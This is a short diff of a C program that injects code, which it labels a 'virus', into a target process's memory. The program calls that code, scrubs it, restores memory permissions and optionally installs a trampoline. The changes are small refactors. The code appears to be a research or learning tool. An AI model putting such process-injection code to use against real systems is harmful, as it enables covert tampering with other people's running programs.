@@ -25,9 +25,7 @@ int main(int const argc, char const * const argv[const]) {
     check_for_error();
 
     INFO("Initializing pstate struct. Getting pid of the target...");
-    pstate_t pstate = create_pstate();
-    strncpy(pstate.name, target, sizeof(pstate.name) - 1);
-    pstate.pid = get_pid(target);
+    pstate_t pstate = {.name = target, .pid = get_pid(target)};
     check_for_error();
     INFO("PID found: %d", pstate.pid);
 
@@ -80,7 +78,7 @@ int main(int const argc, char const * const argv[const]) {
         INFO("Function call: virus(%d) => %d", arg, ret_val);
 
         INFO("Deleting virus from memory");
-        scrub_virus(pstate.pid, memory_address, code_size);
+        scrub_memory(pstate.pid, memory_address, code_size);
 
         INFO("Reverting permissions to original heap permissions on the memory region");
         call_mprotect(&pstate, memory_address, getpagesize(), PROT_READ|PROT_WRITE);
@@ -103,7 +101,7 @@ int main(int const argc, char const * const argv[const]) {
     check_for_error();
 
     if (options.clean == false) {
-        inject_trampoline(pstate.pid, memory_address, entry_function);
+        inject_trampoline(pstate.pid, entry_function, memory_address);
         check_for_error();
         INFO("Injected trampoline. Releasing %s", target);
     }
